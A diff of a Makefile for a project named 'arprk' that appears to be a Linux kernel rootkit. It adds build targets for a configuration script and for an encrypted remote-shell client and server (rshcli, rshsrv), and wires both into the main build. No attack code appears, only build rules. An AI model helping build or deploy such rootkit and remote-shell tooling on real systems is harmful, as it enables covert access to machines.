@@ -5,8 +5,10 @@ EXTRA_CFLAGS := -O0 -I$(PWD)/capstone/include -DCAPSTONE_USE_SYS_DYN_MEM -DCAPST
 
 KERNEL_HEADERS = /lib/modules/$(shell uname -r)/build
 
-CFLAGS_loader.o := -fno-stack-protector -mno-fentry -fno-profile
+CFLAGS_loader.o := -fno-stack-protector -mno-fentry -fno-profile -Wno-error=incompatible-pointer-types
 CFLAGS_kernel.o := -mcmodel=small -mno-fentry -fpic -fpie -fPIE -pie -fno-stack-protector -fno-profile
+
+RSHELL_CFLAGS = -Wall -Os
 
 all: arprk
 
@@ -16,7 +18,14 @@ reloctest:
 	grep -vE "\.cfi|\.file|\.text|\.rodata|\.bss|\.data|\.version|\.section|\.align|\.p2align|\.balign|\.ident|__fentry__|__stack_chk_fail" reloc_test.s >> reloc_test-asm.s 
 	gcc -o reloc_test reloc_test-asm.s
 
-arprk:
+conf:
+	python3 arprk-conf.py
+
+rshell:
+	gcc $(RSHELL_CFLAGS) pel.c aes.c sha1.c rshcli.c -o rshcli
+	gcc $(RSHELL_CFLAGS) pel.c aes.c sha1.c rshsrv.c -o rshsrv -lutil
+
+arprk: conf rshell
 	make V=1 -C $(KERNEL_HEADERS) M=$(PWD) loader.s
 	python remove-unused.py loader.s > loader-asm.s
 	gcc -o loader-asm.o -c loader-asm.s
@@ -36,3 +45,5 @@ clean:
 	make V=1 -C $(KERNEL_HEADERS) M=$(PWD) clean
 	rm -f *.plist
 	make -C python3 clean
+	rm rshcli rshsrv
+	rm arprk-conf.h
